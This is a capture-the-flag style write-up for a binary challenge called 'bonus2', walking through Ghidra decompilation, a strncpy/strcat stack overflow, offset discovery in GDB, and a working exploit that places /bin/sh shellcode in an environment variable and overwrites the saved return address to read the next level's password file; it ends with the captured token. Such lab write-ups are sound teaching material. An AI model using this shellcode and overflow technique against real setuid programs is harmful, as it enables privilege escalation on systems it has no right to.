# Bonus2

1. Decompilation with Ghidra

    **main() function:**

    ```c
    undefined4 main(int param_1, int param_2)
    {
    undefined4 uVar1;
    int iVar2;
    char *pcVar3;
    undefined4 *puVar4;
    byte bVar5;
    char local_60 [40];    // buffer for argv[1]
    char acStack_38 [36];  // buffer for argv[2]
    char *local_14;        // LANG variable
    
    bVar5 = 0;
    if (param_1 == 3) {
        // Initialize buffers
        memset(local_60, 0, 76);
        
        // Copy argv[1] (max 40 bytes) - NO NULL TERMINATION if exactly 40 bytes!
        strncpy(local_60, *(char **)(param_2 + 4), 0x28);
        
        // Copy argv[2] (max 32 bytes) - NO NULL TERMINATION if exactly 32 bytes!
        strncpy(acStack_38, *(char **)(param_2 + 8), 0x20);
        
        // Check LANG environment variable
        local_14 = getenv("LANG");
        if (local_14 != NULL) {
        if (memcmp(local_14, "fi", 2) == 0) {  // Finnish
            language = 1;
        }
        else if (memcmp(local_14, "nl", 2) == 0) {  // Dutch
            language = 2;
        }
        }
        
        // Copy local_60 to stack and call greetuser()
        // ... (stack manipulation) ...
        uVar1 = greetuser();
    }
    else {
        uVar1 = 1;
    }
    return uVar1;
    }
    ```

    **greetuser() function:**

    ```c
    void greetuser(void)
    {
    char local_4c [4];
    undefined4 local_48;
    char local_44 [64];
    
    // Set greeting prefix based on language
    if (language == 1) {
        // Finnish: "Hyvää päivää " (~13 bytes)
        strcpy(local_4c, "Hyvää päivää ");
    }
    else if (language == 2) {
        // Dutch: "Goedemiddag! " (~13 bytes)
        strcpy(local_4c, "Goedemiddag! ");
    }
    else if (language == 0) {
        // English: "Hello " (6 bytes)
        strcpy(local_4c, "Hello ");
    }
    
    // VULNERABILITY: strcat with no size check!
    strcat(local_4c, &stack0x00000004);  // Concatenates argv[1] data
    puts(local_4c);
    return;
    }
    ```

2. Analysis of the vulnerability

    The vulnerability comes from the combination of multiple issues:

    1. **strncpy() doesn't null-terminate**: If the source string is exactly the maximum length (40 or 32 bytes), `strncpy()` does NOT add a null terminator
    2. **Adjacent buffers in memory**: `local_60` (argv[1]) and `acStack_38` (argv[2]) are adjacent in memory
    3. **strcat() reads until null byte**: Without null termination, `strcat()` will read **both argv[1] AND argv[2]** as a single string
    4. **No size check on strcat()**: The concatenation has no bounds checking

    Stack Layout in greetuser() :

    ```
    [local_4c: 4 bytes]  <- Starting address of concatenation
    [local_48: 4 bytes]
    [local_44: 64 bytes]
    --------------------- 72 bytes total
    [saved EBP: 4 bytes]
    [saved EIP: 4 bytes]  <- TARGET: We want to overwrite this!
    ```

    Memory Layout During Exploitation :

    When we provide:

    - `argv[1]` = 40 bytes (exactly, no null byte)
    - `argv[2]` = 32 bytes

    The `strcat()` operation concatenates:

    ```
    [Prefix: ~13 bytes] + [argv[1]: 40 bytes] + [argv[2]: 32 bytes] = 85 bytes total
    ```

    Since the buffer is only 72 bytes:

    - **Overflow: 85 - 72 = 13 bytes**
    - These 13 bytes overwrite saved EBP and **saved EIP**!

3. Exploitation

    1. **Use LANG=fi or LANG=nl** to get a longer prefix (~13 bytes instead of 6)
    2. **Fill argv[1] with 40 bytes** (no null terminator)
    3. **Fill argv[2] with padding + return address**:
    - Offset calculation: 72 (buffer) - 13 (prefix) - 40 (argv[1]) = 19 bytes
    - But saved EBP is 4 bytes, so: 19 - 4 = **15 bytes of padding needed**
    - Actually, through testing: **18 bytes of padding** + 4 bytes address

    Finding the Offset with Pattern :

    Using a De Bruijn pattern in GDB:

    ```bash
    (gdb) run $(python -c 'print "A"*40') $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"')
    ```

    Crash at: `0x41366141` → corresponds to "Aa6A" at **offset 18**

    Payload Structure :

    ```
    argv[1]: [40 bytes of 'A']
    argv[2]: [18 bytes padding] + [shellcode address (4 bytes)]
    ```

4. Exploitation

    Step 1: Export Shellcode in Environment

    ```bash
    export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
    ```

    Step 2: Find Shellcode Address

    Compile and use the getenv helper:

    ```bash
    gcc getenv.c -o /tmp/getenv
    /tmp/getenv SHELLCODE
    ```

    Output: `SHELLCODE is at address: 0xbffff8ae`

    Step 3: Craft and Execute Payload

    ```bash
    export LANG=fi
    ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xae\xf8\xff\xbf"')
    ```

    Payload Breakdown :

    - **LANG=fi**: Sets language to Finnish for longer prefix
    - **argv[1]**: 40 'A' characters (fills buffer without null terminator)
    - **argv[2]**:
    - 18 'B' characters (padding to reach saved EIP)
    - `\xae\xf8\xff\xbf` (address 0xbffff8ae in little-endian)

    Execution Flow :

    1. `strncpy(local_60, argv[1], 40)` copies 40 'A' without null byte
    2. `strncpy(acStack_38, argv[2], 32)` copies our payload
    3. `language = 1` (Finnish) sets prefix to "Hyvää päivää "
    4. `strcat()` concatenates: prefix (13) + argv[1] (40) + argv[2] (22) = 75 bytes
    5. Buffer overflow overwrites saved EIP with 0xbffff8ae
    6. Function returns to shellcode address
    7. Shellcode executes `/bin/sh`
    8. Read `/home/user/bonus3/.pass`

5. Token discovered

    The token is: `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
